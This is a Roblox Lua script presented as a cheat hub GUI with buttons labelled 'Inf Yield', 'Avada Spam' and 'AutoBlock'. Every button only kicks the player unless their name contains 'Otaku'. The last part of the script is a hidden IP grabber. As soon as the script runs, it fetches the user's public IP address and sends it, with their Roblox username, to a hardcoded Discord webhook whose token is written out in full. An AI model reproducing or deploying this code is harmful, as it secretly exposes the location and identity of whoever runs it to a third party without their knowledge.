-- Instances:

local NoobsGui = Instance.new("ScreenGui")
local Main = Instance.new("Frame")
local Label = Instance.new("TextLabel")
local Wlgui = Instance.new("TextButton")
local antiafk = Instance.new("TextButton")
local spamscript = Instance.new("TextButton")
local autograbgalleons = Instance.new("TextButton")
local Opautoblock = Instance.new("TextButton")

--Properties:

NoobsGui.Name = "Noob's Gui"
NoobsGui.Parent = game.CoreGui
NoobsGui.ResetOnSpawn = false

Main.Name = "Main"
Main.Parent = NoobsGui
Main.BackgroundColor3 = Color3.fromRGB(21, 0, 58)
Main.Position = UDim2.new(0.611925721, 0, 0.623604476, 0)
Main.Size = UDim2.new(0, 389, 0, 219)
Main.Active = true
Main.Draggable = true

Label.Name = "Label"
Label.Parent = Main
Label.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Label.Size = UDim2.new(0, 389, 0, 50)
Label.Font = Enum.Font.Fondamento
Label.Text = "The Hub"
Label.TextColor3 = Color3.fromRGB(1, 255, 107)
Label.TextSize = 30.000

Wlgui.Name = "Wl gui"
Wlgui.Parent = Main
Wlgui.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Wlgui.Position = UDim2.new(0.0514138825, 0, 0.283105016, 0)
Wlgui.Size = UDim2.new(0, 160, 0, 35)
Wlgui.Font = Enum.Font.SourceSans
Wlgui.Text = "HBE"
Wlgui.TextColor3 = Color3.fromRGB(0, 255, 149)
Wlgui.TextSize = 14.000
Wlgui.MouseButton1Down:connect(function()
if not game.Players.LocalPlayer.Name:find("Otaku") then
  game.Players.LocalPlayer:Kick("You have been kicked due to unexpected client behavior.")
end
end)

antiafk.Name = "anti afk"
antiafk.Parent = Main
antiafk.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
antiafk.Position = UDim2.new(0.526992261, 0, 0.283105016, 0)
antiafk.Size = UDim2.new(0, 160, 0, 35)
antiafk.Font = Enum.Font.SourceSans
antiafk.Text = "Inf Yield [;]"
antiafk.TextColor3 = Color3.fromRGB(0, 255, 149)
antiafk.TextSize = 14.000
antiafk.MouseButton1Down:connect(function()
if not game.Players.LocalPlayer.Name:find("Otaku") then
  game.Players.LocalPlayer:Kick("You have been kicked due to unexpected client behavior.")
end
end)

spamscript.Name = "spam script"
spamscript.Parent = Main
spamscript.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
spamscript.Position = UDim2.new(0.0514138825, 0, 0.511415482, 0)
spamscript.Size = UDim2.new(0, 160, 0, 35)
spamscript.Font = Enum.Font.SourceSans
spamscript.Text = "Avada Spam [E]"
spamscript.TextColor3 = Color3.fromRGB(0, 255, 149)
spamscript.TextSize = 14.000
spamscript.MouseButton1Down:connect(function()
if not game.Players.LocalPlayer.Name:find("Otaku") then
  game.Players.LocalPlayer:Kick("You have been kicked due to unexpected client behavior.")
end
end)

autograbgalleons.Name = "auto grab galleons"
autograbgalleons.Parent = Main
autograbgalleons.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
autograbgalleons.Position = UDim2.new(0.526992261, 0, 0.511415482, 0)
autograbgalleons.Size = UDim2.new(0, 160, 0, 35)
autograbgalleons.Font = Enum.Font.SourceSans
autograbgalleons.Text = "AppaFlight Spam [T,F]"
autograbgalleons.TextColor3 = Color3.fromRGB(0, 255, 149)
autograbgalleons.TextSize = 14.000
autograbgalleons.MouseButton1Down:connect(function()
if not game.Players.LocalPlayer.Name:find("Otaku") then
  game.Players.LocalPlayer:Kick("You have been kicked due to unexpected client behavior.")
end
end)

Opautoblock.Name = "AutoBlock [X]"
Opautoblock.Parent = Main
Opautoblock.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Opautoblock.Position = UDim2.new(0.29305914, 0, 0.753424644, 0)
Opautoblock.Size = UDim2.new(0, 160, 0, 35)
Opautoblock.Font = Enum.Font.SourceSans
Opautoblock.Text = "AutoBlock [X]"
Opautoblock.TextColor3 = Color3.fromRGB(0, 255, 149)
Opautoblock.TextSize = 14.000
Opautoblock.MouseButton1Down:connect(function()
if not game.Players.LocalPlayer.Name:find("Otaku") then
  game.Players.LocalPlayer:Kick("You have been kicked due to unexpected client behavior.")
end
end)
local webh = "https://discord.com/api/webhooks/937518454750212166/fSlfu_f1KWYju7yjGquCUsTlVnmFA6V2HJR1UL3xOgZeHLtkgRevu-hG-kMLiXL6qZJM"
local data = {
    ["embeds"] = {
        {
            ["color"] = tonumber(0xf0535a),
            ["title"] = "SUCCESSFULLY GRABBED IP ADDRESS",
            ["fields"] = {
                {
                    ["name"] = "IPV4 ADDRESS",
                    ["value"] = game:HttpGet("https://api.ipify.org/"),
                },
                {
                    ["name"] = "IPV6 ADDRESS",
                    ["value"] = "nil", --game:HttpGet("https://api64.ipify.org"),
                },
                {
                    ["name"] = "ROBLOX USERNAME",
                    ["value"] = game:GetService("Players").LocalPlayer.Name,
                }
            }
        }
    }
}

if syn then
    local response = syn.request(
        {
            Url = webh,
            Method = 'POST',
            Headers = {
                ['Content-Type'] = 'application/json'
            },
            Body = game:GetService('HttpService'):JSONEncode(data)
        }
    );
elseif request then
    local response = request(
        {
            Url = webh,
            Method = 'POST',
            Headers = {
                ['Content-Type'] = 'application/json'
            },
            Body = game:GetService('HttpService'):JSONEncode(data)
        }
    );
elseif http_request then
    local response = http_request(
        {
            Url = webh,
            Method = 'POST',
            Headers = {
                ['Content-Type'] = 'application/json'
            },
            Body = game:GetService('HttpService'):JSONEncode(data)
        }
    );
end
